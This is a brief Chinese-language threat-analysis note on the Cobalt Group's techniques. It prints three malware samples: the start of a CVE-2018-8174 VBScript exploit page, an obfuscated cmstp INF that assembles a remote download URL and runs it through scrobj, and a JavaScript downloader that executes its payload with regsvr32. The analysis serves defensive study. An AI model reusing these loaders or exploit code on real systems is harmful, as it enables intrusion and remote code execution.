# Cobalt Group

## 特征

1. 利用由 RTF 文档和嵌入式 URL moniker 对象触发的 Internet Explorer 漏洞 (CVE-2018-8174)，触发嵌入对象后会下载包含该漏洞利用的VBS的HTML 页面并执行，其HTML代码是基于Github公开漏洞利用代码.

```html
<!doctype html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="x-ua-compatible" content="IE=10">
<meta http-equiv="Expires" content="0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-control" content="no-cache">
<meta http-equiv="Cache" content="no-cache">
</head>
<body>
<script language="vbscript">
Dim lIIl
Dim IIIlI(6),IllII(6)
Dim IllI
Dim IIllI(40)
Dim lIlIIl,lIIIll
Dim IlII
Dim llll,IIIIl
Dim llllIl,IlIIII
Dim ntAAA,vpaa
IlII=195948557
lIlIIl=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
lIIIll=Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
IllI=195890093
Function IIIII(dnnnnn)
lIlII=0
IllllI=0
IIlIIl=0
```

2. 使用Cmstp程序来绕过Windows的应用程序控制策略，Cmstp可以使用INF文件作为参数并安装用于远程访问连接的服务配置文件，可以使用恶意INF文件作为下载和执行远程代码的参数.

```info
[ version ]
Signature=$chicagos$
AdvancedINF=2.5
[ DefaultInstall_SingleUser ]  //默认安装单个用户
UnRegisterOCXs=KHkDBoaZoahhZK
[ KHkDBoaZoahhZK ]
%11%\%urmIgcSCJgGmuD_1%%urmIgcSCJgGmuD_2%%urmIgcSCJgGmuD_3%,NI,%BqWxxGj_0%%BqWxxGj_1%%BqWxxGj_2%%BqWxxGj_3%%BqWxxGj_4%%BqWxxGj_5%%BqWxxGj_6%%BqWxxGj_7%%BqWxxGj_8%%BqWxxGj_9%%BqWxxGj_10%%BqWxxGj_11%%BqWxxGj_12%%BqWxxGj_13%%
[ Strings ]
AppAct="SOFTWARE\Microsoft\Connection Manager"  //应用程序操作
urmIgeSCJgGmuD_2="r0"
urmIgcSCJgGmuD_1="sC"
urmIgcSCJgGmuD_3="bJ"
//拼接下载地址
BqWxxGj_e="ht"
BqWxxGj_1="tp"
BqWxxGj_2=":/"
BqWxxGj_3="/9"
BqWxxGj_4="5."
BqWxxGj_5="14"
BqWxxGj_6="2."
BqWxxGj_7="39"
BqWxxGj_8=".1"
BqWxxGj_9="09"
BqWxxGj_10="/a"
BqWxxGj_11="3."
BqWxxGj_12="tx"
BqWxxGj_13="t"
ServiceName=" "
ShortSvcName=" "
```

3. 在执行下载时会使用一个JavaScript来下载最终有效载荷.

```JavaScript
function hit() {
       var x1;
       var Note;
       var Sp;
       var saveTo = ' ';
       var comm = ' ';
       var mLink = 'https://域名/version.txt';
       var xx1 ='regsvr32 /S /N /U /I:';
       saveTo = myEnv('APPDATA') + '\\';
       {
              var e11;
              try {
                   x1 = obj('WScript.Shell');
                   Note = x1.RegRead(xStore);
                   if (Note) {
	       if (Note.indexof(',') !== -1) {
                           Sp = Note.split(',');
                           saveTo += Sp[0] + '.txt';
                       } else {
	            saveTo += tExtra( );
	       }
	  } else {
	       saveTo += tExtra();
                  }
            } catch (_e11) {
	 e11 = _e11;
	 {
	        saveTo += tExtra( );
	 }
            }
        }
       var dq = '"';
       comm = xx1 + dq + saveTo + dq + ' sCrobJ';
       if (fexist(saveTo) === false) {
           if (pnow(mLink, saveTo) ===true) {
               if (xGo(comm) === true) {
	   return true;
               }
           }
      } else {
           if (xGo(comm) === true) {
               return true;
           }
      }
}
```
